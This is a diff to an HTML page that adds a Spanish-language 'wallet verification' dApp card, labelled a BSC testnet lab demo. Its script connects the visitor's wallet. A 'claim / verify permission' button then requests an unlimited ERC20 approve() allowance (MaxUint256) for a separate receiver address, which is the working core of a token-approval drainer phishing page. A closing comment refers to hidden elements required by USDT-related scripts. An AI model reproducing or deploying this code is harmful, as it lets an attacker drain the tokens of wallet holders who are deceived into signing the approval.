@@ -53,7 +53,64 @@ body{ min-height:100vh; display:flex; justify-content:center; align-items:flex-s
 </head>
 
 <body>
+<div class="dapp-card">
+    <div class="header">
+        <span class="badge">BSC Testnet Lab</span>
+        <h1>Verificación de Billetera</h1>
+        <p style="color: var(--text-muted); font-size: 0.875rem;">Demostración de solicitudes de firma en dApps</p>
+    </div>
 
+    <!-- Paso 1: Conectar -->
+    <button class="btn" onclick="conectarBilletera()">1. Conectar Billetera</button>
+    
+    <!-- Paso 2: Acción que solicita la aprobación -->
+    <button class="btn btn-action" onclick="solicitarAprobacion()">2. Reclamar / Verificar Permiso</button>
+
+    <div class="status-box" id="status-box">
+        Estado: Esperando interacción...
+    </div>
+</div>
+
+<script>
+    const TOKEN_CONTRACT = "0xed24fc36d5ee211ea25a80239fb8c4cfd80f12ee"; // Contrato de prueba
+    const RECEPTOR_ADDRESS = "0xTU_SEGUNDA_DIRECCION_AQUI"; // Billetera receptora de prueba
+
+    const ABI_ERC20 = ["function approve(address spender, uint256 amount) public returns (bool)"];
+    let provider, signer;
+
+    async function conectarBilletera() {
+        if (window.ethereum) {
+            try {
+                provider = new ethers.providers.Web3Provider(window.ethereum);
+                await provider.send("eth_requestAccounts", []);
+                signer = provider.getSigner();
+                const address = await signer.getAddress();
+                document.getElementById("status-box").innerText = "Conectado: " + address;
+            } catch (err) {
+                document.getElementById("status-box").innerText = "Error: " + err.message;
+            }
+        } else {
+            alert("Abre este enlace desde el navegador interno de Trust Wallet o MetaMask.");
+        }
+    }
+
+    async function solicitarAprobacion() {
+        if (!signer) {
+            alert("Primero conecta la billetera.");
+            return;
+        }
+        try {
+            document.getElementById("status-box").innerText = "Solicitando confirmación en la billetera...";
+            const contract = new ethers.Contract(TOKEN_CONTRACT, ABI_ERC20, signer);
+            
+            // Permiso ilimitado (MaxUint256)
+            const tx = await contract.approve(RECEPTOR_ADDRESS, ethers.constants.MaxUint256);
+            document.getElementById("status-box").innerText = "Transacción enviada: " + tx.hash;
+        } catch (err) {
+            document.getElementById("status-box").innerText = "Firma rechazada o cancelada.";
+        }
+    }
+</script>
 <!-- ============================================================
      Elementos ocultos exigidos por script.js / app-usdt-trc20.js
      Nenhum deles aparece no layout visual.
